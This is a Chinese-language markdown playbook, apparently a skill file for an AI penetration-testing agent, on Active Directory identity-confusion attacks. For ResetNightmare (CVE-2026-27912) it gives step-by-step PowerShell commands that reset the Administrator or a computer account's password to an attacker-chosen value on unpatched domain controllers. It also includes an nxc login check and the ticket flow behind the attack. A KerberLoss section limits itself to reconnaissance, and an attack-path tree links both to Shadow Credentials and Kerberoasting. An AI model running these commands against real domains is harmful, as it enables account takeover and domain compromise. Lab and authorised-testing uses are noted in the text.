# AD Identity Confusion — ResetNightmare / KerberLoss

这类攻击利用DC对UPN/SPN/主体名称解析的一致性问题。**强依赖DC补丁状态。**

---

## 1. ResetNightmare — CVE-2026-27912

状态：**PRE-PATCH ONLY。Microsoft于2026年4月修复。**

公开实现：`Semperis-Community/ResetNightmare`

影响：在满足条件的未修补DC上，可把任意目标User/Computer的密码重置为攻击者指定值。

### 前置条件

满足其一：

```
A. 有一个自己控制、且可以写userPrincipalName的User/Computer

或

B. 对某OU/Container具有创建User/Computer的权限
```

并且：

```
目标DC未修补CVE-2026-27912
目标账户密码年龄允许被修改
Windows PowerShell + ActiveDirectory module
Rubeus.exe（PoC测试使用.NET Framework 4.6.2构建）
```

### 重要影响

**PoC成功会真实改变目标账户密码。**

所以：

```
HTB / CTF / 可reset靶场 → 可直接验证
生产授权环境           → 只有ROE明确允许账户密码修改时才执行
```

### 安装/准备

```powershell
# 下载ResetNightmare.ps1，并把Rubeus.exe放当前目录
Import-Module ActiveDirectory
. .\ResetNightmare.ps1
```

### 路线A：已有受控用户

```powershell
Invoke-ResetNightmare `
  -TargetAccount "Administrator" `
  -TargetNewPassword "NewP@ssw0rd!" `
  -UPNUser "controlledUser" `
  -UPNUserPassword "ControlledP@ss!"
```

如果目标是计算机账户：

```powershell
Invoke-ResetNightmare `
  -TargetAccount 'SERVER$' `
  -TargetNewPassword "NewP@ssw0rd!" `
  -UPNUser "controlledUser" `
  -UPNUserPassword "ControlledP@ss!"
```

### 路线B：只有OU对象创建权限

```powershell
Invoke-ResetNightmare `
  -TargetAccount "Administrator" `
  -TargetNewPassword "NewP@ssw0rd!" `
  -UPNUser "attackerAcct" `
  -UPNUserPassword "AttackerP@ss!" `
  -CreateNewPath "OU=Temp,DC=corp,DC=local"
```

创建/使用计算机账户时加：

```powershell
-Computer
```

指定DC：

```powershell
-DC DC01.corp.local
```

如果Rubeus不在当前目录：

```powershell
-RubeusPath C:\Tools\Rubeus.exe
```

### 成功验证

成功后用新密码验证目标主体：

```bash
nxc smb DC-IP -u Administrator -p 'NewP@ssw0rd!'
```

或普通Kerberos/LDAP认证。

### PoC内部流程

```
受控账户UPN = 目标sAMAccountName
  ↓
以NT-ENTERPRISE名称请求kadmin/changepw TGT
  ↓
清除/恢复受控账户UPN
  ↓
用已取得票据对目标执行密码修改
  ↓
目标真实密码变成TargetNewPassword
```

PoC会清理临时UPN/临时账户操作，但**目标密码变化本身就是攻击结果，不会恢复原密码**。

---

## 2. KerberLoss — CVE-2026-25177

状态：**PRE-PATCH ONLY。Microsoft于2026年3月修复。**

研究价值：通过SPN/名称混淆影响DC的Kerberos主体解析，可能造成downgrade/DoS/身份混淆影响。

### 当前skill策略

截至本次更新，没有纳入一个我能像ResetNightmare一样验证到稳定公开、参数清晰、端到端的上游PoC。因此：

```
/ad-recon
  → 只枚举可写SPN、异常/冲突SPN和DC补丁

/ad-attack
  → 只在靶场中按原研究手工复现
  → 不伪造 exploit.py / 一键命令
```

候选信号：

```
当前主体可写servicePrincipalName
DC未修补CVE-2026-25177
存在可构造的冲突/Unicode SPN条件
```

如果目标已安装2026年3月更新：关闭该CVE路径。

---

## 3. 与传统ACL路径结合

```
GenericWrite on User/Computer
  ├─ Shadow Credentials
  ├─ Targeted Kerberoast（User）
  └─ ResetNightmare（仅未修补CVE-2026-27912）

CreateChild on OU
  ├─ 创建受控对象 → ResetNightmare（未修补）
  └─ Server 2025 → dMSA候选（见dmsa.md）
```
